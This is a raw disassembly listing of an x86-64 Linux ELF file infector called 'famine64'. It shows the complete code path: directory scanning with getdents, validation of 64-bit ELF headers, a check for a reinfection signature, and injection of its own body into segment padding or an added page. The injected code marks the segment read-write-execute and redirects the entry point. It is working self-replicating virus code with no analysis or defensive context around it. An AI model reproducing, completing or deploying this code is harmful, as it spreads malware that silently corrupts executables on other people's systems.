    103a:	add    ecx,r15d
    103d:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    1045:	movsxd rcx,ecx
    1048:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    104d:	lea    ecx,[rdx+0x8]
    1050:	cmp    eax,ecx
    1052:	jle    1124 <get_dat_elf+0x3b4>
    1058:	movsxd rsi,ecx
    105b:	add    ecx,r15d
    105e:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    1066:	movsxd rcx,ecx
    1069:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    106e:	lea    ecx,[rdx+0x9]
    1071:	cmp    eax,ecx
    1073:	jle    1124 <get_dat_elf+0x3b4>
    1079:	movsxd rsi,ecx
    107c:	add    ecx,r15d
    107f:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    1087:	movsxd rcx,ecx
    108a:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    108f:	lea    ecx,[rdx+0xa]
    1092:	cmp    eax,ecx
    1094:	jle    1124 <get_dat_elf+0x3b4>
    109a:	movsxd rsi,ecx
    109d:	add    ecx,r15d
    10a0:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    10a8:	movsxd rcx,ecx
    10ab:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    10b0:	lea    ecx,[rdx+0xb]
    10b3:	cmp    eax,ecx
    10b5:	jle    1124 <get_dat_elf+0x3b4>
    10b7:	movsxd rsi,ecx
    10ba:	add    ecx,r15d
    10bd:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    10c5:	movsxd rcx,ecx
    10c8:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    10cd:	lea    ecx,[rdx+0xc]
    10d0:	cmp    eax,ecx
    10d2:	jle    1124 <get_dat_elf+0x3b4>
    10d4:	movsxd rsi,ecx
    10d7:	add    ecx,r15d
    10da:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    10e2:	movsxd rcx,ecx
    10e5:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    10ea:	lea    ecx,[rdx+0xd]
    10ed:	cmp    eax,ecx
    10ef:	jle    1124 <get_dat_elf+0x3b4>
    10f1:	movsxd rsi,ecx
    10f4:	add    edx,0xe
    10f7:	add    ecx,r15d
    10fa:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    1102:	movsxd rcx,ecx
    1105:	cmp    eax,edx
    1107:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    110c:	jle    1124 <get_dat_elf+0x3b4>
    110e:	movsxd rcx,edx
    1111:	add    edx,r15d
    1114:	movzx  ecx,BYTE PTR [rsp+rcx*1+0x420]
    111c:	movsxd rdx,edx
    111f:	mov    BYTE PTR [r13+rdx*1+0x0],cl
    1124:	add    r15d,eax
    1127:	jmp    ed0 <get_dat_elf+0x160>
    112c:	mov    esi,ebp
    112e:	mov    edi,0x3
    1133:	xor    eax,eax
    1135:	call   670 <syscall@plt>
    113a:	add    rsp,0x828
    1141:	pop    rbx
    1142:	pop    rbp
    1143:	pop    r12
    1145:	pop    r13
    1147:	pop    r14
    1149:	pop    r15
    114b:	ret    
    114c:	lea    edx,[rax-0x1]
    114f:	lea    r10,[rbp+rdx*1+0x1]
    1154:	mov    rdx,rbp
    1157:	nop    WORD PTR [rax+rax*1+0x0]
    1160:	movzx  esi,BYTE PTR [rdx]
    1163:	lea    rcx,[r14+rdx*1]
    1167:	add    rdx,0x1
    116b:	cmp    rdx,r10
    116e:	mov    BYTE PTR [rcx+rdi*1],sil
    1172:	jne    1160 <get_dat_elf+0x3f0>
    1174:	jmp    1124 <get_dat_elf+0x3b4>
    1176:	mov    rbp,QWORD PTR [rsp+0x18]
    117b:	mov    DWORD PTR [rsp],eax
    117e:	mov    edi,0x3
    1183:	xor    eax,eax
    1185:	mov    r14,r13
    1188:	mov    esi,ebp
    118a:	call   670 <syscall@plt>
    118f:	mov    edx,DWORD PTR [rsp]
    1192:	test   edx,edx
    1194:	jne    11ae <get_dat_elf+0x43e>
    1196:	cmp    DWORD PTR [rsp+0x10],0x3f
    119b:	jle    11ae <get_dat_elf+0x43e>
    119d:	cmp    DWORD PTR [r13+0x0],0x464c457f
    11a5:	jne    11ae <get_dat_elf+0x43e>
    11a7:	cmp    BYTE PTR [r13+0x4],0x2
    11ac:	je     11d6 <get_dat_elf+0x466>
    11ae:	mov    edx,DWORD PTR [rsp+0x10]
    11b2:	mov    rsi,r14
    11b5:	mov    edi,0xb
    11ba:	xor    eax,eax
    11bc:	call   670 <syscall@plt>
    11c1:	jmp    113a <get_dat_elf+0x3ca>
    11c6:	mov    esi,ebp
    11c8:	mov    edi,0x3
    11cd:	xor    eax,eax
    11cf:	call   670 <syscall@plt>
    11d4:	jmp    11ae <get_dat_elf+0x43e>
    11d6:	cmp    BYTE PTR [r13+0x5],0x0
    11db:	je     11ae <get_dat_elf+0x43e>
    11dd:	cmp    BYTE PTR [r13+0x6],0x1
    11e2:	jne    11ae <get_dat_elf+0x43e>
    11e4:	movzx  eax,WORD PTR [r13+0x10]
    11e9:	sub    eax,0x2
    11ec:	cmp    ax,0x1
    11f0:	ja     11ae <get_dat_elf+0x43e>
    11f2:	cmp    WORD PTR [r13+0x12],0x3e
    11f8:	jne    11ae <get_dat_elf+0x43e>
    11fa:	cmp    QWORD PTR [r13+0x20],0x40
    11ff:	jne    11ae <get_dat_elf+0x43e>
    1201:	movzx  edx,WORD PTR [r13+0x38]
    1206:	movsxd rcx,DWORD PTR [rsp+0x10]
    120b:	lea    rax,[rdx*8+0x0]
    1213:	sub    rax,rdx
    1216:	lea    rax,[rax*8+0x40]
    121e:	cmp    rcx,rax
    1221:	jb     11ae <get_dat_elf+0x43e>
    1223:	mov    rsi,QWORD PTR [r13+0x28]
    1227:	cmp    rsi,0x3f
    122b:	jbe    11ae <get_dat_elf+0x43e>
    122d:	movzx  eax,WORD PTR [r13+0x3c]
    1232:	mov    rdx,rax
    1235:	shl    rax,0x6
    1239:	add    rax,rsi
    123c:	cmp    rcx,rax
    123f:	jb     11ae <get_dat_elf+0x43e>
    1245:	cmp    DWORD PTR [r13+0x34],0x380040
    124d:	jne    11ae <get_dat_elf+0x43e>
    1253:	cmp    WORD PTR [r13+0x3a],0x40
    1259:	jne    11ae <get_dat_elf+0x43e>
    125f:	movzx  eax,WORD PTR [r13+0x3e]
    1264:	cmp    dx,ax
    1267:	jbe    11ae <get_dat_elf+0x43e>
    126d:	test   ax,ax
    1270:	je     11ae <get_dat_elf+0x43e>
    1276:	mov    esi,DWORD PTR [rsp+0x10]
    127a:	mov    rdi,QWORD PTR [rsp+0x8]
    127f:	mov    rdx,r13
    1282:	call   8c0 <pack_dat_elf>
    1287:	jmp    11ae <get_dat_elf+0x43e>
    128c:	lea    rax,[rsp+0x20]
    1291:	mov    QWORD PTR [rsp+0x8],rax
    1296:	mov    rsi,rax
    1299:	jmp    df4 <get_dat_elf+0x84>
    129e:	xor    ecx,ecx
    12a0:	jmp    db3 <get_dat_elf+0x43>
    12a5:	nop
    12a6:	nop    WORD PTR cs:[rax+rax*1+0x0]

00000000000012b0 <find_files>:
    12b0:	push   r15
    12b2:	push   r14
    12b4:	xor    ecx,ecx
    12b6:	push   r13
    12b8:	push   r12
    12ba:	mov    rsi,rdi
    12bd:	push   rbp
    12be:	push   rbx
    12bf:	xor    eax,eax
    12c1:	mov    r12,rdi
    12c4:	mov    edx,0x90800
    12c9:	mov    edi,0x2
    12ce:	sub    rsp,0x418
    12d5:	call   670 <syscall@plt>
    12da:	cmp    eax,0xffffffff
    12dd:	mov    QWORD PTR [rsp+0x8],rax
    12e2:	je     134d <find_files+0x9d>
    12e4:	lea    r15,[rsp+0x10]
    12e9:	mov    r13d,eax
    12ec:	nop    DWORD PTR [rax+0x0]
    12f0:	xor    eax,eax
    12f2:	mov    ecx,0x400
    12f7:	mov    rdx,r15
    12fa:	mov    esi,r13d
    12fd:	mov    edi,0xd9
    1302:	call   670 <syscall@plt>
    1307:	test   eax,eax
    1309:	mov    r14d,eax
    130c:	jle    133d <find_files+0x8d>
    130e:	xor    ebp,ebp
    1310:	jmp    1323 <find_files+0x73>
    1312:	nop    WORD PTR [rax+rax*1+0x0]
    1318:	movzx  eax,WORD PTR [rbx+0x10]
    131c:	add    ebp,eax
    131e:	cmp    r14d,ebp
    1321:	jle    12f0 <find_files+0x40>
    1323:	movsxd rbx,ebp
    1326:	add    rbx,r15
    1329:	cmp    BYTE PTR [rbx+0x12],0x8
    132d:	jne    1318 <find_files+0x68>
    132f:	lea    rsi,[rbx+0x13]
    1333:	mov    rdi,r12
    1336:	call   d70 <get_dat_elf>
    133b:	jmp    1318 <find_files+0x68>
    133d:	mov    esi,DWORD PTR [rsp+0x8]
    1341:	mov    edi,0x3
    1346:	xor    eax,eax
    1348:	call   670 <syscall@plt>
    134d:	add    rsp,0x418
    1354:	pop    rbx
    1355:	pop    rbp
    1356:	pop    r12
    1358:	pop    r13
    135a:	pop    r14
    135c:	pop    r15
    135e:	ret    
    135f:	nop

0000000000001360 <famine64_func>:
    1360:	and    al,0xac
    1362:	out    dx,eax
    1363:	and    al,0x42
    1365:	dec    dl
    1367:	rex.X push rax
    1369:	push   rdi
    136a:	sub    rsp,0x10
    136e:	jmp    19fe <famine64_end>
    1373:	mov    QWORD PTR [rsp],0x0

000000000000137b <dir_loop>:
    137b:	mov    rax,QWORD PTR [rsp]
    137f:	lea    rdi,[rip+0x6f3]        # 1a79 <dir_all>
    1386:	mov    rdi,QWORD PTR [rdi+rax*8]
    138a:	cmp    rdi,0x0
    138e:	je     19fe <famine64_end>
    1394:	call   13a0 <find_files>
    1399:	add    QWORD PTR [rsp],0x1
    139e:	jmp    137b <dir_loop>

00000000000013a0 <find_files>:
    13a0:	push   rax
    13a1:	push   rbx
    13a2:	push   rdx
    13a3:	push   rdi
    13a4:	push   rsi
    13a5:	sub    rsp,0x410
    13ac:	xor    eax,eax
    13ae:	mov    QWORD PTR [rsp],rdi
    13b2:	mov    edx,0x0
    13b7:	mov    esi,0x90800
    13bc:	mov    rdi,QWORD PTR [rsp]
    13c0:	mov    eax,0x2
    13c5:	syscall 
    13c7:	mov    DWORD PTR [rsp+0x8],eax
    13cb:	cmp    DWORD PTR [rsp+0x8],0x0
    13d0:	jl     1428 <find_files_end>

00000000000013d2 <loop_file>:
    13d2:	xor    eax,eax
    13d4:	mov    edi,DWORD PTR [rsp+0x8]
    13d8:	lea    rsi,[rsp+0x10]
    13dd:	mov    edx,0x400
    13e2:	mov    eax,0xd9
    13e7:	syscall 
    13e9:	test   eax,eax
    13eb:	jle    141d <loop_end>
    13ed:	mov    DWORD PTR [rsp+0xc],eax
    13f1:	xor    rax,rax
    13f4:	xor    rbx,rbx
    13f7:	jmp    1406 <check_file_type>

00000000000013f9 <next_file>:
    13f9:	movsx  eax,WORD PTR [rsp+rbx*1+0x20]
    13fe:	add    ebx,eax
    1400:	cmp    DWORD PTR [rsp+0xc],ebx
    1404:	jle    13d2 <loop_file>

0000000000001406 <check_file_type>:
    1406:	cmp    BYTE PTR [rsp+rbx*1+0x22],0x8
    140b:	jne    13f9 <next_file>
    140d:	mov    rdi,QWORD PTR [rsp]
    1411:	lea    rsi,[rsp+rbx*1+0x23]
    1416:	call   1435 <get_dat_elf>
    141b:	jmp    13f9 <next_file>

000000000000141d <loop_end>:
    141d:	mov    edi,DWORD PTR [rsp+0x8]
    1421:	mov    eax,0x3
    1426:	syscall 

0000000000001428 <find_files_end>:
    1428:	add    rsp,0x410
    142f:	pop    rsi
    1430:	pop    rdi
    1431:	pop    rdx
    1432:	pop    rbx
    1433:	pop    rax
    1434:	ret    

0000000000001435 <get_dat_elf>:
    1435:	push   rax
    1436:	push   rcx
    1437:	push   rdx
    1438:	push   rdi
    1439:	push   rsi
    143a:	push   r8
    143c:	push   r9
    143e:	push   r10
    1440:	push   r11
    1442:	sub    rsp,0x400
    1449:	xor    ecx,ecx
    144b:	movzx  edx,BYTE PTR [rdi]
    144e:	test   dl,dl
    1450:	je     1460 <copy_file>

0000000000001452 <copy_dir_bytes>:
    1452:	mov    BYTE PTR [rsp+rcx*1],dl
    1455:	inc    rcx
    1458:	movzx  edx,BYTE PTR [rdi+rcx*1]
    145c:	test   dl,dl
    145e:	jne    1452 <copy_dir_bytes>

0000000000001460 <copy_file>:
    1460:	add    rsp,rcx
    1463:	xor    eax,eax
    1465:	movzx  edx,BYTE PTR [rsi]
    1468:	test   dl,dl
    146a:	je     147a <open_file>

000000000000146c <copy_file_bytes>:
    146c:	mov    BYTE PTR [rsp+rax*1],dl
    146f:	inc    rax
    1472:	movzx  edx,BYTE PTR [rsi+rax*1]
    1476:	test   dl,dl
    1478:	jne    146c <copy_file_bytes>

000000000000147a <open_file>:
    147a:	mov    BYTE PTR [rsp+rax*1],0x0
    147e:	sub    rsp,rcx
    1481:	sub    rsp,0x10
    1485:	mov    DWORD PTR [rsp],0xffffffff
    148c:	mov    QWORD PTR [rsp+0x4],0xffffffffffffffff
    1495:	mov    QWORD PTR [rsp+0x8],0xffffffffffffffff
    149e:	mov    edx,0x0
    14a3:	mov    esi,0x800
    14a8:	lea    rdi,[rsp+0x10]
    14ad:	mov    eax,0x2
    14b2:	syscall 
    14b4:	mov    DWORD PTR [rsp],eax
    14b7:	cmp    rax,0x0
    14bb:	jl     1616 <get_dat_elf_end>
    14c1:	mov    edx,0x2
    14c6:	mov    esi,0x1
    14cb:	mov    edi,eax
    14cd:	mov    eax,0x8
    14d2:	syscall 
    14d4:	mov    DWORD PTR [rsp+0x4],eax
    14d8:	cmp    rax,0x0
    14dc:	jle    15f4 <close_file>
    14e2:	mov    eax,DWORD PTR [rsp+0x4]
    14e6:	mov    r9d,0x0
    14ec:	mov    r8d,0xffffffff
    14f2:	mov    r10d,0x22
    14f8:	mov    edx,0x3
    14fd:	mov    rsi,rax
    1500:	mov    edi,0x0
    1505:	mov    eax,0x9
    150a:	syscall 
    150c:	mov    QWORD PTR [rsp+0x8],rax
    1511:	cmp    rax,0xffffffffffffffff
    1515:	jle    15f4 <close_file>
    151b:	mov    edx,0x0
    1520:	mov    esi,0x0
    1525:	mov    edi,DWORD PTR [rsp]
    1528:	mov    eax,0x8
    152d:	syscall 
    152f:	cmp    rax,0x0
    1533:	jl     15f4 <close_file>
    1539:	sub    rsp,0x410
    1540:	mov    DWORD PTR [rsp],0x0
    1547:	mov    DWORD PTR [rsp+0x4],0x0

000000000000154f <read_loop>:
    154f:	mov    eax,DWORD PTR [rsp+0x4]
    1553:	add    DWORD PTR [rsp],eax
    1556:	mov    edx,0x400
    155b:	lea    rsi,[rsp+0x8]
    1560:	mov    edi,DWORD PTR [rsp+0x410]
    1567:	mov    eax,0x0
    156c:	syscall 
    156e:	mov    DWORD PTR [rsp+0x408],eax
    1575:	cmp    DWORD PTR [rsp+0x408],0x0
    157d:	jle    15b5 <read_loop_end>
    157f:	mov    DWORD PTR [rsp+0x4],0x0

0000000000001587 <read_loop_copy>:
    1587:	mov    eax,DWORD PTR [rsp+0x4]
    158b:	cmp    eax,DWORD PTR [rsp+0x408]
    1592:	jge    154f <read_loop>
    1594:	mov    eax,DWORD PTR [rsp+0x4]
    1598:	movzx  eax,BYTE PTR [rsp+rax*1+0x8]
    159d:	mov    edx,DWORD PTR [rsp]
    15a0:	add    edx,DWORD PTR [rsp+0x4]
    15a4:	add    rdx,QWORD PTR [rsp+0x418]
    15ac:	mov    BYTE PTR [rdx],al
    15ae:	add    DWORD PTR [rsp+0x4],0x1
    15b3:	jmp    1587 <read_loop_copy>

00000000000015b5 <read_loop_end>:
    15b5:	add    rsp,0x410
    15bc:	mov    edi,DWORD PTR [rsp]
    15bf:	mov    eax,0x3
    15c4:	syscall 
    15c6:	cmp    DWORD PTR [rsp-0x8],0x0
    15cb:	jne    15fe <munmap_file>
    15cd:	mov    rsi,QWORD PTR [rsp+0x8]
    15d2:	mov    edi,DWORD PTR [rsp+0x4]
    15d6:	call   162b <check_file>
    15db:	cmp    rax,0x1
    15df:	jne    15fe <munmap_file>
    15e1:	mov    rdx,QWORD PTR [rsp+0x8]
    15e6:	mov    esi,DWORD PTR [rsp+0x4]
    15ea:	lea    rdi,[rsp+0x10]
    15ef:	call   16b4 <infect_file>

00000000000015f4 <close_file>:
    15f4:	mov    edi,DWORD PTR [rsp]
    15f7:	mov    eax,0x3
    15fc:	syscall 

00000000000015fe <munmap_file>:
    15fe:	cmp    QWORD PTR [rsp+0x10],0xffffffffffffffff
    1604:	je     1616 <get_dat_elf_end>
    1606:	mov    esi,DWORD PTR [rsp+0x4]
    160a:	mov    rdi,QWORD PTR [rsp+0x8]
    160f:	mov    eax,0xb
    1614:	syscall 

0000000000001616 <get_dat_elf_end>:
    1616:	add    rsp,0x410
    161d:	pop    r11
    161f:	pop    r10
    1621:	pop    r9
    1623:	pop    r8
    1625:	pop    rsi
    1626:	pop    rdi
    1627:	pop    rdx
    1628:	pop    rcx
    1629:	pop    rax
    162a:	ret    

000000000000162b <check_file>:
    162b:	xor    rax,rax
    162e:	cmp    rdi,0x3f
    1632:	jl     16b3 <check_end>
    1634:	cmp    DWORD PTR [rsi],0x464c457f
    163a:	jne    16b3 <check_end>
    163c:	cmp    BYTE PTR [rsi+0x4],0x2
    1640:	jne    16b3 <check_end>
    1642:	cmp    BYTE PTR [rsi+0x5],0x0
    1646:	je     16b3 <check_end>
    1648:	cmp    BYTE PTR [rsi+0x6],0x1
    164c:	jne    16b3 <check_end>
    164e:	movzx  edx,WORD PTR [rsi+0x10]
    1652:	sub    edx,0x2
    1655:	cmp    dl,0x1
    1658:	ja     16b3 <check_end>
    165a:	cmp    WORD PTR [rsi+0x12],0x3e
    165f:	jne    16b3 <check_end>
    1661:	cmp    QWORD PTR [rsi+0x20],0x40
    1666:	jne    16b3 <check_end>
    1668:	movzx  edx,WORD PTR [rsi+0x38]
    166c:	imul   edx,edx,0x38
    166f:	add    rdx,QWORD PTR [rsi+0x20]
    1673:	cmp    rdx,rdi
    1676:	ja     16b3 <check_end>
    1678:	cmp    QWORD PTR [rsi+0x28],0x40
    167d:	jl     16b3 <check_end>
    167f:	movzx  edx,WORD PTR [rsi+0x3c]
    1683:	imul   edx,edx,0x40
    1686:	add    rdx,QWORD PTR [rsi+0x28]
    168a:	cmp    rdx,rdi
    168d:	ja     16b3 <check_end>
    168f:	cmp    WORD PTR [rsi+0x34],0x40
    1694:	jne    16b3 <check_end>
    1696:	cmp    WORD PTR [rsi+0x36],0x38
    169b:	jne    16b3 <check_end>
    169d:	cmp    WORD PTR [rsi+0x3a],0x40
    16a2:	jne    16b3 <check_end>
    16a4:	movzx  edx,WORD PTR [rsi+0x3c]
    16a8:	cmp    WORD PTR [rsi+0x3e],dx
    16ac:	jae    16b3 <check_end>
    16ae:	mov    eax,0x1

00000000000016b3 <check_end>:
    16b3:	ret    

00000000000016b4 <infect_file>:
    16b4:	push   r15
    16b6:	push   r14
    16b8:	push   r13
    16ba:	push   r12
    16bc:	push   rbp
    16bd:	push   rbx
    16be:	mov    r8,QWORD PTR [rdx+0x20]
    16c2:	lea    r8,[rdx+r8*1]
    16c6:	xor    rcx,rcx
    16c9:	movzx  ecx,WORD PTR [rdx+0x38]
    16cd:	xor    r9,r9
    16d0:	movzx  r9d,WORD PTR [rdx+0x36]
    16d5:	imul   rcx,r9
    16d9:	add    rcx,r8
    16dc:	mov    r10,QWORD PTR [rdx+0x18]
    16e0:	jmp    16f0 <get_segment>

00000000000016e2 <next_segment>:
    16e2:	add    r8w,WORD PTR [rdx+0x36]
    16e7:	cmp    r8,rcx
    16ea:	jge    19f3 <infect_file_end_pop>

00000000000016f0 <get_segment>:
    16f0:	cmp    DWORD PTR [r8],0x1
    16f4:	jne    16e2 <next_segment>
    16f6:	cmp    QWORD PTR [r8+0x10],r10
    16fa:	jg     16e2 <next_segment>
    16fc:	mov    r9,QWORD PTR [r8+0x10]
    1700:	add    r9,QWORD PTR [r8+0x20]
    1704:	cmp    r9,r10
    1707:	jl     16e2 <next_segment>
    1709:	cmp    r8,rcx
    170c:	jge    19f3 <infect_file_end_pop>

0000000000001712 <check_signature>:
    1712:	mov    r9,rdx
    1715:	add    r9,rsi
    1718:	sub    r9,0x9
    171c:	mov    r9,QWORD PTR [r9]
    171f:	cmp    r9,QWORD PTR [rip+0xfffffffffffffc3a]        # 1360 <famine64_func>
    1726:	je     19f3 <infect_file_end_pop>
    172c:	sub    rsp,0xbc
    1733:	mov    DWORD PTR [rsp],0x0
    173a:	mov    QWORD PTR [rsp+0x4],rdx
    173f:	mov    QWORD PTR [rsp+0xc],rsi
    1744:	mov    QWORD PTR [rsp+0x14],0x0
    174d:	mov    QWORD PTR [rsp+0x1c],0x0
    1756:	mov    QWORD PTR [rsp+0x24],r8
    175b:	mov    QWORD PTR [rsp+0x2c],rdi
    1760:	mov    QWORD PTR [rsp+0x34],0x0
    1769:	lea    rsi,[rsp+0x34]
    176e:	mov    eax,0x4
    1773:	syscall 
    1775:	cmp    eax,0x0
    1778:	jne    19ec <infect_file_end_add>
    177e:	mov    esi,0x41
    1783:	mov    rdx,QWORD PTR [rsp+0x4c]
    1788:	mov    eax,0x2
    178d:	syscall 
    178f:	cmp    eax,0x0
    1792:	jl     19ec <infect_file_end_add>
    1798:	mov    DWORD PTR [rsp],eax
    179b:	mov    r8,QWORD PTR [rsp+0x24]
    17a0:	mov    r9,QWORD PTR [r8+0x8]
    17a4:	add    r9,QWORD PTR [r8+0x20]
    17a8:	mov    QWORD PTR [rsp+0x1c],r9
    17ad:	mov    r8,QWORD PTR [rsp+0x24]
    17b2:	mov    r9,QWORD PTR [r8+0x10]
    17b6:	add    r9,QWORD PTR [r8+0x20]
    17ba:	mov    r8,QWORD PTR [rsp+0x4]
    17bf:	sub    r9,QWORD PTR [r8+0x18]
    17c3:	imul   r9,r9,0xffffffffffffffff
    17c7:	mov    QWORD PTR [rsp+0x14],r9
    17cc:	mov    r8,QWORD PTR [rsp+0x4]
    17d1:	mov    r9,QWORD PTR [rsp+0x24]
    17d6:	mov    r9,QWORD PTR [r9+0x10]
    17da:	add    r9,QWORD PTR [rsp+0x1c]
    17df:	mov    QWORD PTR [r8+0x18],r9
    17e3:	mov    r8,QWORD PTR [rsp+0x24]
    17e8:	mov    r9,QWORD PTR [rsp+0x4]
    17ed:	xor    r10,r10
    17f0:	mov    r10w,WORD PTR [r9+0x36]
    17f5:	add    r10,r8
    17f8:	mov    r9,QWORD PTR [r10+0x8]
    17fc:	sub    r9,QWORD PTR [r8+0x8]
    1800:	sub    r9,QWORD PTR [r8+0x28]
    1804:	cmp    r9d,DWORD PTR [rip+0x223]        # 1a2e <famine64_size>
    180b:	jg     1936 <infect_file_in_padding>
    1811:	xor    rax,rax

0000000000001814 <compute_padding>:
    1814:	add    eax,0x1000
    1819:	cmp    eax,DWORD PTR [rip+0x20f]        # 1a2e <famine64_size>
    181f:	jl     1814 <compute_padding>
    1821:	mov    rdx,QWORD PTR [rsp+0x4]
    1826:	mov    r8,QWORD PTR [rdx+0x20]
    182a:	lea    r8,[rdx+r8*1]
    182e:	xor    rcx,rcx
    1831:	movzx  ecx,WORD PTR [rdx+0x38]
    1835:	xor    r9,r9
    1838:	movzx  r9d,WORD PTR [rdx+0x36]
    183d:	imul   rcx,r9
    1841:	add    rcx,r8
    1844:	mov    r9,QWORD PTR [rsp+0x24]
    1849:	mov    r10,QWORD PTR [r9+0x8]
    184d:	add    r10,QWORD PTR [r9+0x20]

0000000000001851 <next_segment2>:
    1851:	add    r8w,WORD PTR [rdx+0x36]
    1856:	cmp    rcx,r8
    1859:	jle    1867 <modify_sections>
    185b:	cmp    QWORD PTR [r8+0x8],r10
    185f:	jl     1851 <next_segment2>
    1861:	add    QWORD PTR [r8+0x8],rax
    1865:	jmp    1851 <next_segment2>

0000000000001867 <modify_sections>:
    1867:	mov    r8,QWORD PTR [rdx+0x28]
    186b:	lea    r8,[rdx+r8*1]
    186f:	xor    rcx,rcx
    1872:	movzx  ecx,WORD PTR [rdx+0x3c]
    1876:	xor    r9,r9
    1879:	movzx  r9d,WORD PTR [rdx+0x3a]
    187e:	imul   rcx,r9
    1882:	add    rcx,r8

0000000000001885 <next_section2>:
    1885:	add    r8w,WORD PTR [rdx+0x3a]
    188a:	cmp    rcx,r8
    188d:	jle    189b <modify_shoff>
    188f:	cmp    QWORD PTR [r8+0x18],r10
    1893:	jl     1885 <next_section2>
    1895:	add    QWORD PTR [r8+0x18],rax
    1899:	jmp    1885 <next_section2>

000000000000189b <modify_shoff>:
    189b:	mov    rcx,QWORD PTR [rsp+0x4]
    18a0:	add    QWORD PTR [rcx+0x28],rax

00000000000018a4 <infect_file_add_padding>:
    18a4:	mov    r8,QWORD PTR [rsp+0x24]
    18a9:	add    QWORD PTR [r8+0x20],rax
    18ad:	add    QWORD PTR [r8+0x28],rax
    18b1:	xor    r9,r9
    18b4:	or     r9,0x1
    18b8:	or     r9,0x2
    18bc:	or     r9,0x4
    18c0:	mov    DWORD PTR [r8+0x4],r9d
    18c4:	mov    QWORD PTR [rsp+0x2c],rax
    18c9:	mov    eax,0x1
    18ce:	mov    edi,DWORD PTR [rsp]
    18d1:	mov    rsi,QWORD PTR [rsp+0x4]
    18d6:	mov    rdx,QWORD PTR [rsp+0x1c]
    18db:	syscall 
    18dd:	mov    eax,0x1
    18e2:	mov    edi,DWORD PTR [rsp]
    18e5:	lea    rsi,[rip+0xfffffffffffffa74]        # 1360 <famine64_func>
    18ec:	mov    edx,DWORD PTR [rip+0x13c]        # 1a2e <famine64_size>
    18f2:	sub    edx,0x8
    18f5:	syscall 
    18f7:	mov    eax,0x1
    18fc:	mov    edi,DWORD PTR [rsp]
    18ff:	lea    rsi,[rsp+0x14]
    1904:	mov    edx,0x8
    1909:	syscall 

000000000000190b <write_zeros>:
    190b:	mov    eax,0x1
    1910:	mov    edi,DWORD PTR [rsp]
    1913:	lea    rsi,[rip+0x113]        # 1a2d <data>
    191a:	mov    edx,0x1
    191f:	syscall 
    1921:	sub    QWORD PTR [rsp+0x2c],0x1
    1927:	mov    rax,QWORD PTR [rsp+0x2c]
    192c:	cmp    eax,DWORD PTR [rip+0xfc]        # 1a2e <famine64_size>
    1932:	jg     190b <write_zeros>
    1934:	jmp    19ab <write_end>

0000000000001936 <infect_file_in_padding>:
    1936:	xor    r9,r9
    1939:	mov    r9d,DWORD PTR [rip+0xee]        # 1a2e <famine64_size>
    1940:	add    QWORD PTR [r8+0x20],r9
    1944:	add    QWORD PTR [r8+0x28],r9
    1948:	xor    r9,r9
    194b:	or     r9,0x1
    194f:	or     r9,0x2
    1953:	or     r9,0x4
    1957:	mov    DWORD PTR [r8+0x4],r9d
    195b:	mov    eax,0x1
    1960:	mov    edi,DWORD PTR [rsp]
    1963:	mov    rsi,QWORD PTR [rsp+0x4]
    1968:	mov    rdx,QWORD PTR [rsp+0x1c]
    196d:	syscall 
    196f:	mov    eax,0x1
    1974:	mov    edi,DWORD PTR [rsp]
    1977:	lea    rsi,[rip+0xfffffffffffff9e2]        # 1360 <famine64_func>
    197e:	mov    edx,DWORD PTR [rip+0xaa]        # 1a2e <famine64_size>
    1984:	sub    edx,0x8
    1987:	syscall 
    1989:	mov    eax,0x1
    198e:	mov    edi,DWORD PTR [rsp]
    1991:	lea    rsi,[rsp+0x14]
    1996:	mov    edx,0x8
    199b:	syscall 
    199d:	xor    rax,rax
    19a0:	mov    eax,DWORD PTR [rip+0x88]        # 1a2e <famine64_size>
    19a6:	add    QWORD PTR [rsp+0x1c],rax

00000000000019ab <write_end>:
    19ab:	mov    eax,0x1
    19b0:	mov    edi,DWORD PTR [rsp]
    19b3:	mov    rsi,QWORD PTR [rsp+0x4]
    19b8:	add    rsi,QWORD PTR [rsp+0x1c]
    19bd:	mov    rdx,QWORD PTR [rsp+0xc]
    19c2:	sub    rdx,QWORD PTR [rsp+0x1c]
    19c7:	sub    edx,0x1
    19ca:	syscall 
    19cc:	mov    eax,0x1
    19d1:	mov    edi,DWORD PTR [rsp]
    19d4:	lea    rsi,[rip+0xfffffffffffff985]        # 1360 <famine64_func>
    19db:	mov    edx,0x8
    19e0:	syscall 
    19e2:	mov    eax,0x3
    19e7:	mov    edi,DWORD PTR [rsp]
    19ea:	syscall 

00000000000019ec <infect_file_end_add>:
    19ec:	add    rsp,0xbc

00000000000019f3 <infect_file_end_pop>:
    19f3:	pop    rbx
    19f4:	pop    rbp
    19f5:	pop    r12
    19f7:	pop    r13
    19f9:	pop    r14
    19fb:	pop    r15

00000000000019fd <infect_file_end>:
    19fd:	ret    

00000000000019fe <famine64_end>:
    19fe:	cmp    QWORD PTR [rip+0x8b],0x0        # 1a91 <jump_offset>
    1a06:	je     1a16 <no_jump>
    1a08:	lea    rax,[rip+0xfffffffffffff951]        # 1360 <famine64_func>
    1a0f:	add    QWORD PTR [rip+0x7b],rax        # 1a91 <jump_offset>

0000000000001a16 <no_jump>:
    1a16:	add    rsp,0x10
    1a1a:	pop    rdi
    1a1b:	pop    rax
    1a1c:	cmp    QWORD PTR [rip+0x6d],0x0        # 1a91 <jump_offset>
    1a24:	je     1a2c <do_ret>
    1a26:	push   QWORD PTR [rip+0x65]        # 1a91 <jump_offset>

0000000000001a2c <do_ret>:
    1a2c:	ret    

0000000000001a2d <data>:
	...

0000000000001a2e <famine64_size>:
    1a2e:	9...

0000000000001a32 <banner>:
    1a32:	rex.RX (bad) 
    1a34:	ins    DWORD PTR es:[rdi],dx
    1a35:	imul   ebp,DWORD PTR [rsi+0x65],0x72657620
    1a3c:	jae    1aa7 <__libc_csu_init+0x7>
    1a3e:	outs   dx,DWORD PTR ds:[rsi]
    1a3f:	outs   dx,BYTE PTR ds:[rsi]
